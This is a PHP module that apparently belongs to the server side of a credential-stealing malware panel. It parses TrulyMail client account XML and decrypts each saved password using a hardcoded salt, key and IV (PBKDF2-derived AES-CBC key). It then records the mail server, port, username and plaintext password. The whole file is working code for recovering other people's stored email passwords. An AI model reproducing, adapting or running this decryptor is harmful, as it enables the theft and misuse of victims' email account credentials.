<?php
class Module_trulymail extends Module_
{
	public $Mails = array();
	
	protected function Decrypt($Source)
	{
		if(!strlen($Source))
			return '';
		
		$Valid = substr($Source, 0, 1);
		if($Valid != "!" && $Valid != "*")
		{
			return '';
		}
		
		$Source = substr($Source, 1);
		$Decoded = base64_decode($Source);
		if(!$Decoded)
			return '';
		
		$SALT = "65c316040773588d5fcc294205ea556227cef9482e4f";
		$KEY_ = "8748ADD1-9501-4cc0-A9E8-8B547E84595D";
		$IV__ = "D7139CB11810CF27131454ACD6DEE776";
		
		$Key = Rfc2898DeriveBytes($KEY_, hex2bin($SALT), 10000, 32);
	
		return FixNonPrintable(mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $Key, $Decoded, MCRYPT_MODE_CBC, hex2bin($IV__)));
	}
	public function ProcessItem($Source)
    {
		$Type = Assign_($Source["Type"]);
		$ID__ = Assign_($Source["ID"]);
		$User = Assign_($Source["Username"]);
		$Pass = $this->Decrypt(Assign_($Source["Password"]));
		$Host = Assign_($Source["ServerAddress"]);
		$Port = Assign_($Source["ServerPort"]);
		$Mail = '';
		
		if(isset($Source["DisplayEmail"]))
		{
			$Mail = Assign_($Source["DisplayEmail"]);
			$this->Mails[$ID__] = $Mail;
		}
		else
		{
			if($Type != "SMTP")
			{
				$ID__ = Assign_($Source["SMTPProfileID"]);
				if(isset($Source["SMTPProfileID"]) && isset($this->Mails[$ID__]))
				{
					$Mail = $this->Mails[$ID__];
				}
			}
		}
		
		$this->add_email($Mail, strtolower($Type), $Host, $Port, $User, $Pass);
    }
	
    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
			$XML_ = simplexml_load_string($Data);
			if(!$XML_)
				return FALSE;

			if(isset($XML_->Accounts))
			{
			   foreach($XML_->Accounts->children() as $Element)
				{
					if(isset($Element["Password"]))
						$this->ProcessItem($Element);
				}
			}
			$this->Mails = $XML_ = NULL;
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}

